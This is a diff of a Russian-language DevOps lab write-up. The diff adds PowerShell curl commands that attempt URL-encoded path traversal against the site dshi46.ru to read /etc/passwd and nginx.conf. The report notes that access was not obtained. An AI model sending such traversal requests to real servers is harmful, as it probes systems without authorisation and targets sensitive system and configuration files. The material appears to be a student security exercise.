@@ -23,6 +23,12 @@ curl -Uri "https://dshi46.ru/../../../../etc/passwd" | select -First 5
 ![res1](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res1.png)
 
 Попробуем закодировать символы ( %2f = / и, если сервер вдруг на Windows: %5c = \ ), а также получить файл с конфигурациями nginx
+```
+curl -Uri "https://dshi46.ru/..%2f..%2f..%2f..%2fetc%2fpasswd" | select -First 5
+curl -Uri "https://dshi46.ru/..%5c..%5c..%5c..%5cetc%2fpasswd" | select -First 5
+curl -Uri "https://dshi46.ru/..%2f..%2f..%2fetc%2fnginx%2fnginx.conf" | select -First 5
+```
+
 ![res2](https://github.com/MkrtchyanKarina/DevOps_labs/blob/master/lab1_extra/img/res2.png)
 
 Как видим, доступ получить не удалось :(
